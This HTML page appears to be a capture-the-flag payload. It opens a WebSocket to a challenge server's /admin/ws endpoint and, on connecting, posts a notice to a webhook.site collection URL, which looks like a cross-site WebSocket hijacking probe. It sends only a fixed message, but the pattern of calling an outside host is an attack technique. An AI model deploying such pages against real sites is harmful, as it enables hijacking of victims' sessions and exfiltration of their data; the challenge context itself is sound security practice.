<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebSocket Debug and Feedback</title>
</head>
<body>
    <h1>WebSocket Debug - Post to Webhook on Connect</h1>

    <script>
        // Create a new WebSocket connection to /admin/ws
        const socket = new WebSocket('ws://ce441-web.spchallenge.ir:8080/admin/ws');

        // Event handler for when the WebSocket is open
        socket.onopen = function() {
            console.log('WebSocket connected');
            
            // Send feedback to the webhook when WebSocket connection is successful
            sendFeedbackToWebhook();
        };

        // Event handler for receiving messages from the WebSocket
        socket.onmessage = function(event) {
            console.log('Message from server: ', event.data);
        };

        // Function to send feedback to the webhook (on WebSocket connection)
        function sendFeedbackToWebhook() {
            fetch('https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    feedback: 'WebSocket connection established successfully.'
                })
            })
            .then(response => response.json())
            .then(json => console.log('Feedback sent to webhook:', json))
            .catch(error => console.error('Error sending feedback to webhook:', error));
        }

        // Event handler for WebSocket errors
        socket.onerror = function(error) {
            console.error('WebSocket Error:', error);
        };

        // Event handler for WebSocket closure
        socket.onclose = function() {
            console.log('WebSocket closed');
        };
    </script>
</body>
</html>
